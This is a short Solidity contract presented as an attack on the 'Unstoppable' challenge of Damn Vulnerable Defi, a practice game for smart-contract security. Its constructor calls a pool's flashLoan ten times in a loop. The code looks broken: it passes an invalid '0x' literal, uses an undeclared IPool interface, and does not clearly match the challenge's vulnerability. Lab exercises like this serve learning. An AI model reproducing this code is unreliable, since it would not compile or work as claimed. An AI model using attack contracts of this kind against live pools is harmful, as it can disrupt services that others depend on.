contract AttackUnstoppable {
   // This smart contract implements an Attack Unstoppable challenge from Damn Vulnerable Defi.
    address private constant addressjs = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    
    constructor(address pool_address, address target) {
        // Perform a loop to crate multiple flash loans
        for(uint256 count = 0; count < 10; count++) {
            IPool(pool_address).flashLoan(target, addressjs, 0x, "");
        }
    }
}
